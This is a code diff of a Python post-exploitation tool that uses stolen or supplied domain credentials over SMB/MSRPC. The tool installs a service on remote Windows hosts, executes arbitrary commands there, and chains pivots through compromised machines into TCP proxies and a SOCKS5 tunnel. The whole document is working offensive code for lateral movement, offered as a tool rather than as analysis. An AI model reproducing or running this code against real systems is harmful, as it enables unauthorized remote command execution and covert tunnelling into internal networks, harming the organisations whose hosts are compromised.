@@ -182,9 +182,13 @@ def msrpc(target):
 	rpctransport.set_credentials(username, password, domain, "", "", None)
 
 	dce = rpctransport.get_dce_rpc()
-	dce.connect()
-	dce.bind(MSRPC_UUID_lateral)
-	return dce
+	try:
+		dce.connect()
+		dce.bind(MSRPC_UUID_lateral)
+		return dce
+	except Exception as e:
+		print(target.target + ": " + str(e))
+		return False
 
 def execute(cmd, target):
 	dce = msrpc(target)
@@ -198,8 +202,8 @@ def execute(cmd, target):
 	dce.disconnect()
 	return result
 
-def proxy(chain, target):
-	def print_proxy_chain(chain, direction="->"):
+class Connection:
+	def print_proxy_chain(self, chain, direction="->"):
 		def chain_walk(the_chain, current):
 			if the_chain.target == current.target:
 				print(f"[{the_chain.target}]",end="")
@@ -212,7 +216,7 @@ def proxy(chain, target):
 		stdout.write("\r")
 		stdout.flush()
 
-	def incoming(chain, dce_session, c, sock, connect_id):
+	def incoming(self, chain, dce_session, c, sock, connect_id):
 		dce = dce_session["dce"]
 		while True:
 			if not chain.connections[connect_id]:
@@ -236,7 +240,7 @@ def proxy(chain, target):
 				break
 			sock = unpack("<I", res[:4])[0]
 			#print("<- " + str(len(data)))
-			print_proxy_chain(chain, direction="<-")
+			self.print_proxy_chain(chain, direction="<-")
 			try:
 				dce_session["sockets"][sock].send(data)
 			except:
@@ -245,7 +249,7 @@ def proxy(chain, target):
 				break
 		print("[debug] end thread incoming")
 
-	def outcoming(chain, dce_session, c, sock, connect_id):
+	def outcoming(self, chain, dce_session, c, sock, connect_id):
 		dce = dce_session["dce"]
 		while True:
 			try:
@@ -259,7 +263,7 @@ def proxy(chain, target):
 				chain.connections[connect_id] = False
 				break
 			#print("-> " + str(len(data)))
-			print_proxy_chain(chain, direction="->")
+			self.print_proxy_chain(chain, direction="->")
 			send = Send()
 			send["socket"] = sock
 			send["data"] = data + b"\x00"
@@ -269,13 +273,7 @@ def proxy(chain, target):
 			dce_session["mutex"].release()
 		print("[debug] end thread outcoming")
 
-	def redirect(c, chain, target, connect_id):
-		if not chain.dce_session:
-			chain.dce_session = {
-				"main": {"dce": msrpc(chain), "mutex": threading.Lock()},
-				"incoming": {"dce": msrpc(chain), "mutex": threading.Lock(), "sockets": {}},
-				"outcoming": {"dce": msrpc(chain), "mutex": threading.Lock()},
-			}
+	def __init__(self, c, chain, target, connect_id):
 		dce = chain.dce_session["main"]["dce"]
 		connect = Connect()
 		connect["ip"] = target.ip + "\x00"
@@ -286,8 +284,8 @@ def proxy(chain, target):
 		if res["socket"]:
 			chain.connections[connect_id] = True
 			chain.dce_session["incoming"]["sockets"][res["socket"]] = c
-			incoming_thr = Thread(target=incoming, args=(chain, chain.dce_session["incoming"], c, res["socket"], connect_id))
-			outcoming_thr = Thread(target=outcoming, args=(chain, chain.dce_session["outcoming"], c, res["socket"], connect_id))
+			incoming_thr = Thread(target=self.incoming, args=(chain, chain.dce_session["incoming"], c, res["socket"], connect_id))
+			outcoming_thr = Thread(target=self.outcoming, args=(chain, chain.dce_session["outcoming"], c, res["socket"], connect_id))
 			incoming_thr.start()
 			outcoming_thr.start()
 			while chain.connections[connect_id]:
@@ -312,12 +310,13 @@ def proxy(chain, target):
 			'''
 		#dce.disconnect()
 
+def proxy(chain, target):
 	def serve(s, chain, target):
 		local_port = s.getsockname()[1]
 		while True:
 			c,info = s.accept()
 			connect_id = info[1] #client rport
-			redirect_thr = Thread(target=redirect, args=(c, chain, target, connect_id))
+			redirect_thr = Thread(target=Connection, args=(c, chain, target, connect_id))
 			redirect_thr.start()
 			#print(f"[*] start proxy to {chain.target} ({info[0]}:{info[1]} -> {local_port})")
 
@@ -333,13 +332,6 @@ def test_tcp(chain, target):
 	global dce_sessions
 	ip_from, port_from = target_from
 	ip_to, port_to = target_to
-
-	if not dce_sessions.get(ip_from):
-		dce_sessions[ip_from] = {
-			"main": {"dce": msrpc(chain), "mutex": threading.Lock()},
-			"incoming": {"dce": msrpc(chain), "mutex": threading.Lock()},
-			"outcoming": {"dce": msrpc(chain), "mutex": threading.Lock()},
-		}
 
 	dce = dce_sessions[ip_from]["main"]["dce"]
 	connect = Connect()
@@ -359,7 +351,7 @@ def test_tcp(chain, target):
 		return False
 
 def socks(port):
-	global dce_sessions, chain
+	global chain
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 	s.bind(("127.0.0.1", port))
@@ -367,12 +359,6 @@ def socks(port):
 	while True:
 		c,info = s.accept()
 		print("[socks] via %s" % chain.target)
-		if not dce_sessions.get(chain.target_ip):
-			dce_sessions[chain.target_ip] = {
-				"main": {"dce": msrpc(chain), "mutex": threading.Lock()},
-				"incoming": {"dce": msrpc(chain), "mutex": threading.Lock()},
-				"outcoming": {"dce": msrpc(chain), "mutex": threading.Lock()},
-			}
 		req = c.recv(1024)
 		ver,nauth = unpack("cc", req[:2])
 		c.send(b"\x05\x00")
@@ -381,51 +367,10 @@ def socks(port):
 		if op == b"\x01" and addr_type == b"\x01":
 			addr = socket.inet_ntoa(req[4:8])
 			port = unpack('>H', req[8:10])[0]
-			print(addr,port)
-			
-			dce = dce_sessions[chain.target_ip]["main"]["dce"]
-			connect = Connect()
-			connect["ip"] = addr + "\x00"
-			connect["port"] = port
-			dce_sessions[chain.target_ip]["main"]["mutex"].acquire()
-			res = dce.request(connect, checkError=False)
-			dce_sessions[chain.target_ip]["main"]["mutex"].release()
-			sock = res["socket"]
-		if res["socket"]:
+			print(f"[+] {addr}:{port}")
+			connect_id = info[1] #client rport
+			Thread(target=Connection, args=(c, chain, parse_target([addr, str(port)]), connect_id)).start()
 			c.send(b"\x05\x00\x00\x01"+req[4:8]+req[8:10])
-			while True:
-				data = c.recv(1024)
-				if not data:
-					break
-				send = Send()
-				send["socket"] = sock
-				send["data"] = data + b"\x00"
-				send["len"] = len(data)
-				dce_sessions[chain.target_ip]["outcoming"]["mutex"].acquire()
-				res = dce.request(send, checkError=False)
-				dce_sessions[chain.target_ip]["outcoming"]["mutex"].release()
-
-				recv = Recv()
-				recv["sockets_count"] = 1
-				recv["sockets"] = [sock]
-				recv["len"] = 1024
-				dce_sessions[chain.target_ip]["incoming"]["mutex"].acquire()
-				dce.call(recv.opnum, recv)
-				res = dce.recv()
-				dce_sessions[chain.target_ip]["incoming"]["mutex"].release()
-				length = unpack("<i", res[-4:])[0]
-				data = res[ 8 : length+8 ]
-				if length > 0:
-					sock = unpack("<I", res[:4])[0]
-					c.send(data)
-				else:
-					break
-			disconnect = Disconnect()
-			disconnect["socket"] = sock
-			dce_sessions[chain.target_ip]["main"]["mutex"].acquire()
-			res = dce.request(disconnect)
-			dce_sessions[chain.target_ip]["main"]["mutex"].release()
-		c.close()
 	s.close()
 
 def check_pipe(target):
@@ -458,6 +403,26 @@ class Chain:
 		self.next[-1].prev = self
 		self.next[-1].target_ip = "127.0.0.1"
 		return self.next[-1]
+	def auth(self, user, passwd, domain):
+		self.creds = user, passwd, domain
+		if self.dce_session:
+			self.deauth()
+		else:
+			if not check_pipe(target=self):
+				install_service(target=self)
+		self.dce_session = {
+			"main": {"dce": msrpc(self), "mutex": threading.Lock()},
+			"incoming": {"dce": msrpc(self), "mutex": threading.Lock(), "sockets": {}},
+			"outcoming": {"dce": msrpc(self), "mutex": threading.Lock()},
+		}
+		for flow in ["main", "incoming", "outcoming"]:
+			if not self.dce_session[flow]["dce"]:
+				return False
+		return True
+	def deauth(self):
+		for flow in ["main", "incoming", "outcoming"]:
+			if self.dce_session[flow]["dce"]:
+				self.dce_session[flow]["dce"].disconnect()
 
 def chain_get_root(the_chain):
 	while True:
@@ -470,6 +435,12 @@ def chain_walk(the_chain, deep=0):
 	print(" "*deep + ("`" if deep > 0 else "") + (the_chain.target if the_chain.target != chain.target else the_chain.target+" <-"))
 	for the_chain in the_chain.next:
 		chain_walk(the_chain, deep+1)
+
+def chain_get(the_chain, the_target):
+	if the_chain.target == the_target:
+		return the_chain
+	for the_chain in the_chain.next:
+		return chain_get(the_chain, the_target)
 
 def parse_target(cmd):
 	arg_parser = argparse.ArgumentParser()
@@ -486,16 +457,17 @@ def cmd_loop(line):
 	global chain
 	if not line:
 		return
-	if line.startswith("proxy "):
+	if line.startswith("shell ") or line.startswith("proxy "):
 		target = parse_target(line.strip().split(" ")[1:])
 		if chain:
 			port = proxy(chain, target)
 			chain = chain.new(target.ip, port)
 		else:
 			chain = Chain(target.ip, 445)
-		chain.creds = (target.user, target.passwd, target.domain)
-	elif line.startswith("shell "):
-		pass
+		if not chain.auth(target.user, target.passwd, target.domain):
+			chain = chain.prev
+			if chain:
+				chain.next.pop()
 	elif line.startswith("test "):
 		if chain:
 			target = parse_target(line.strip().split(" ")[1:])
@@ -505,16 +477,17 @@ def cmd_loop(line):
 		chain_walk(chain_get_root(chain))
 	elif line in ("back",):
 		chain = chain.prev
-	elif line in ("goto ",):
-		pass
+	elif line.startswith("goto "):
+		new_target = line.split()[1]
+		new_location = chain_get(chain_get_root(chain), new_target)
+		if new_location:
+			chain = new_location
 	elif line in ('exit', 'quit', 'q'):
 		exit()
 	elif line in ('help',):
 		pass
 	else:
 		cmd = line
-		if not check_pipe(target=chain):
-			install_service(target=chain)
 		print(execute(cmd, target=chain))
 
 if __name__ == '__main__':
